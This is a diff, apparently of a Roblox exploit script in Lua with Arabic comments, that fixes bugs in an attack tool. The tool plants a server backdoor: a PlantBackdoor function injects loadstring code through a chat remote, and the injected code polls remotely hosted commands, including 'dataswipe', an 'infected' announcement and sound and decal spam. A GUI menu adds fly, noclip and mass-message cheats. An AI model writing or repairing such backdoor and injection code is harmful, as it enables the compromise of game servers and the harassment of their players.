@@ -289,7 +289,7 @@ local function executeGlobalCommand(command)
             bv:Destroy()
         end
     elseif cmd == "decalspam" then
-        task.spawn(runDecalSpam)
+        task.spawn(function() runDecalSpam() end)   -- تم التغليف لحل الخطأ
     end
 end
 
@@ -438,7 +438,7 @@ local function PlantBackdoor()
     end
     if not chatRemote then return false end
 
-    -- الكود الخبيث الذي سيتم حقنه في السيرفر (يقرأ الأوامر من GitHub وينفذها)
+    -- الكود الخبيث الذي سيتم حقنه في السيرفر
     local backdoorCode = [[
         local HttpService = game:GetService("HttpService")
         local Workspace = game:GetService("Workspace")
@@ -506,8 +506,8 @@ local function PlantBackdoor()
             exPro(Workspace)
             for _, v in pairs(Workspace:GetChildren()) do
                 if v:IsA("Sound") then v:Stop(); v:Destroy() end
-            end
-          local snd = Instance.new("Sound")
+end
+    local snd = Instance.new("Sound")
     snd.SoundId = "rbxassetid://72089843969979"
     snd.Volume = 10
     snd.Looped = true
@@ -530,7 +530,7 @@ local function PlantBackdoor()
     end
     if not chatRemote then return false end
 
-    -- الكود الخبيث الذي سيتم حقنه في السيرفر (يقرأ الأوامر من GitHub وينفذها)
+    -- الكود الخبيث الذي سيتم حقنه في السيرفر
     local backdoorCode = [[
         local HttpService = game:GetService("HttpService")
         local Workspace = game:GetService("Workspace")
@@ -654,7 +654,7 @@ local function PlantBackdoor()
             elseif cmd == "color" then
                 Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
             elseif cmd == "decalspam" then
-                task.spawn(runDecalSpam)
+                task.spawn(function() runDecalSpam() end)   -- تغليف لتجنب الخطأ
             elseif cmd == "announce" then
                 sendMessageToAll("[OMEGA] Server infected by 109er_0!")
             elseif cmd == "dataswipe" then
@@ -666,7 +666,6 @@ local function PlantBackdoor()
             end
         end
 
-        -- بدء الاستماع
         lastCommand = fetchGlobalCommand()
         if lastCommand ~= "" then
             print("[BACKDOOR] Initial command: " .. lastCommand)
@@ -683,7 +682,6 @@ local function PlantBackdoor()
         end
     ]]
 
-    -- حقن الكود عبر chat remote
     local injection = 'loadstring(' .. HttpService:JSONEncode(backdoorCode) .. ')()'
     pcall(function() chatRemote:FireServer(injection) end)
     task.wait(1)
@@ -801,7 +799,7 @@ local function executeCommand(cmd)
     elseif cmd == "plant" then
         infectionActive = PlantBackdoor()
     elseif cmd == "decalspam" then
-        task.spawn(runDecalSpam)
+        task.spawn(function() runDecalSpam() end)   -- تم التغليف أيضاً هنا
     elseif cmd:match("^رساله") then
         local customMsg = cmd:match("رساله%s+(.+)$")
         if customMsg then sendGlobalMessageToAllPlayers(customMsg) end
@@ -888,7 +886,7 @@ local function CreateMenuGUI()
     closeBtn.Parent = titleBar
     closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 
-    -- آلية السحب الصحيحة
+    -- آلية السحب
     local UserInputService = game:GetService("UserInputService")
     local dragging, dragStart, frameStart
     titleBar.InputBegan:Connect(function(input)
@@ -942,7 +940,6 @@ local function CreateMenuGUI()
     statusLabel.Parent = buttonContainer
     statusLabel.LayoutOrder = 999
 
-    -- تعريف الأزرار (جميع الأوامر)
     local commands = {
         {name = "Fly", cmd = "fly"},
         {name = "NoClip", cmd = "noclip"},
@@ -1003,7 +1000,6 @@ local function CreateMenuGUI()
             end
         end)
     end
-
     -- مربع رسالة مخصصة
     local msgFrame = Instance.new("Frame")
     msgFrame.Size = UDim2.new(1, -10, 0, 36)
@@ -1036,12 +1032,11 @@ local function CreateMenuGUI()
         if txt ~= "" then
             sendGlobalMessageToAllPlayers(txt)
             statusLabel.Text = "تم إرسال الرسالة"
-            statusLabel.TextColor3 = Color3.fromrgb(100,255,100)
+            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
             msgInput.Text = ""
         end
     end)
 
-    -- ضبط حجم Canvas تلقائياً
     layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         buttonContainer.CanvasSize = UDim2.new(0, layout.AbsoluteContentSize.X, 0, layout.AbsoluteContentSize.Y + 40)
     end)
@@ -1087,3 +1082,4 @@ local function Launch()
 end
 
 Launch()
+    
